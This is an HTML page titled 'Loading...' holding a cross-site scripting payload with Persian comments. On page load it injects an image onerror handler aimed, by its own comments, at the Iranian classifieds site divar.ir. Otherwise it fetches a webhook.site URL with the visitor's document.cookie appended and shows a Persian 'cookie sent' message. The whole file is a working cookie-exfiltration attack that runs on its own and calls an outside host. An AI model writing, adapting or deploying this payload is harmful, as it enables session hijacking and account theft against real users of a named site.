<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <script>
        // Payload XSS - ارسال Cookie به Webhook
        (function() {
            // روش 1: استفاده از img tag
            const payload = '<img src=x onerror="fetch(\'https://webhook.site/912764f1-e7f7-4391-8808-f4f9f5c3f9a1?cookie=\'+encodeURIComponent(document.cookie))">';
            
            // اگر در صفحه divar.ir هستیم، payload را تزریق می‌کنیم
            const mainContent = document.getElementById('main-content');
            if (mainContent) {
                mainContent.innerHTML = payload;
            } else {
                // اگر عنصر main-content وجود نداشت، مستقیماً cookie را ارسال می‌کنیم
                fetch('https://webhook.site/912764f1-e7f7-4391-8808-f4f9f5c3f9a1?cookie=' + encodeURIComponent(document.cookie))
                    .then(() => {
                        console.log('✅ Cookie ارسال شد!');
                        document.body.innerHTML = '<h1 style="text-align:center;padding:50px;">Cookie ارسال شد!</h1>';
                    })
                    .catch(err => {
                        console.error('❌ خطا:', err);
                        document.body.innerHTML = '<h1 style="text-align:center;padding:50px;">خطا در ارسال Cookie</h1>';
                    });
            }
        })();
    </script>
</body>
</html>
